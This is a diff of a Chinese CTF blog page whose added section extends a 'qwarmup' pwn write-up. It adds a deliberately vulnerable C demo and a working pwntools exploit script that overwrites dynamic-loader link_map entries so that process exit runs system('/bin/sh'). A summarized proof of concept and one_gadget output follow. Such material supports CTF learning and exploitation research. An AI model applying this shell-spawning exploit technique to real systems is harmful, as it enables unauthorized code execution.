@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://cnitlrt.github.io/qwarmup/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-07-04T22:20:17+08:00" />
-<meta property="article:modified_time" content="2023-07-05T07:47:12+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta property="article:modified_time" content="2023-07-05T09:50:36+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
 
@@ -34,8 +34,8 @@
                             "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "pwn","wordcount":  2036 ,
-        "url": "https:\/\/cnitlrt.github.io\/qwarmup\/","datePublished": "2023-07-04T22:20:17+08:00","dateModified": "2023-07-05T07:47:12+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "posts","keywords": "pwn","wordcount":  2674 ,
+        "url": "https:\/\/cnitlrt.github.io\/qwarmup\/","datePublished": "2023-07-04T22:20:17+08:00","dateModified": "2023-07-05T09:50:36+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -113,8 +113,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">qwb-2022-qwarmup复现</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pwn/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>pwn</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-04">2023-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2036 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-04">2023-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2674 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -139,6 +139,12 @@
           </ul>
         </li>
         <li><a href="#总结">总结</a></li>
+        <li><a href="#延申">延申</a>
+          <ul>
+            <li><a href="#例子">例子</a></li>
+            <li><a href="#可以获取shell的exp">可以获取shell的exp</a></li>
+          </ul>
+        </li>
       </ul>
     </li>
   </ul>
@@ -605,12 +611,253 @@
 </div>
 </div><h2 id="总结">总结</h2>
 <p>修改[l]的地址可以控制写入的位置</p>
-<p>修改[l +  0x68]可以控制解析函数时候的第一个参数位置</p></div><div class="post-footer" id="post-footer">
+<p>修改[l +  0x68]可以控制解析函数时候的第一个参数位置</p>
+<h2 id="延申">延申</h2>
+<p><del>如果将write函数去掉该如何做呢？</del></p>
+<p><a href="https://hackmd.io/@pepsipu/S15ivxPDt" target="_blank" rel="noopener noreffer ">参考链接</a></p>
+<p>很牛的一个方法，<del>可以链子，搞得dl_fini里面的东西，可以四个链子貌似</del></p>
+<p>只能第一个</p>
+<p>但是缺点是在ld，远程可能需要一定的运气成分在里面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705090658521.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705090658521.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705090658521.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705090658521.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705090658521.png"
+        title="image-20230705090658521" /></p>
+<h3 id="例子">例子</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//gcc poc.c -o poc
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">content</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span><span class="mh">0x4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">==</span> <span class="mh">0x1234</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">content</span><span class="p">,</span><span class="mh">0x1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">addr</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705084943999.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705084943999.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705084943999.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705084943999.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230705084943999.png"
+        title="image-20230705084943999" /></p>
+<p>libc版本为：Ubuntu GLIBC 2.31-0ubuntu9.10</p>
+<h3 id="可以获取shell的exp">可以获取shell的exp</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#context.log_level = &#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x100000</span><span class="p">))</span> <span class="c1">#触发mmap使得申请的堆块和libc紧挨着</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># p.send(p64(0x340290))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># p.send(p8(0))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write</span><span class="p">(</span><span class="mh">0x346290</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1">#使得DT_FINI_ARRAY为NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write</span><span class="p">(</span><span class="mh">0x346228</span><span class="p">,</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x7e80</span><span class="o">-</span><span class="mh">0x8</span><span class="p">))</span> <span class="c1">#劫持DT_FINI指向DT_DEBUG</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write</span><span class="p">(</span><span class="mh">0x346180</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffe0d130</span><span class="p">))</span> <span class="c1">#将l_addr改为DT_DEBUg和system函数的差值</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write</span><span class="p">(</span><span class="mh">0x345958</span><span class="p">,</span><span class="s2">&#34;/bin/sh;&#34;</span><span class="p">)</span> <span class="c1">#劫持参数</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># attach(p,&#34;b _dl_fini&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># attach(p)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lg</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s2">&#34;: 0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">se</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rl</span>  <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span>     <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">0xe3afe execve(&#34;/bin/sh&#34;, r15, r12)
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [r15] == NULL || r15 == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [r12] == NULL || r12 == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">0xe3b01 execve(&#34;/bin/sh&#34;, r15, rdx)
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [r15] == NULL || r15 == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [rdx] == NULL || rdx == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">0xe3b04 execve(&#34;/bin/sh&#34;, rsi, rdx)
+</span></span></span><span class="line"><span class="cl"><span class="s2">constraints:
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [rsi] == NULL || rsi == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">  [rdx] == NULL || rdx == NULL
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>大概的意思就是下面的这个poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># disable fini array from exec</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">ld</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">link_map</span> <span class="o">+</span> <span class="n">l_info</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">DT_FINI_ARRAY</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># overwrite l_info[DT_FINI]&#39;s lsb so that it points to _r_debug</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">ld</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">link_map</span> <span class="o">+</span> <span class="n">l_info</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">DT_FINI</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb8</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># overwrite l_addr with offset to bring _r_debug to system</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ld</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">link_map</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="n">ld</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_r_debug&#34;</span><span class="p">],</span> <span class="n">signed</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fill _dl_load_lock with /bin/sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">ld</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_rtld_global&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">_dl_load_lock</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2023-07-05&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/8f3ea6b3ad4db9fef6919a727cb6d6e384ecebe0" target="_blank" title="commit by cnitlrt(1258175307@qq.com) 8f3ea6b3ad4db9fef6919a727cb6d6e384ecebe0: test">
-                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>8f3ea6b</a></span>
+                <span>更新于 2023-07-05&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/52d3809ecbb8985f2cc8781fbcc734ea1a35e7b2" target="_blank" title="commit by cnitlrt(1258175307@qq.com) 52d3809ecbb8985f2cc8781fbcc734ea1a35e7b2: test">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>52d3809</a></span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
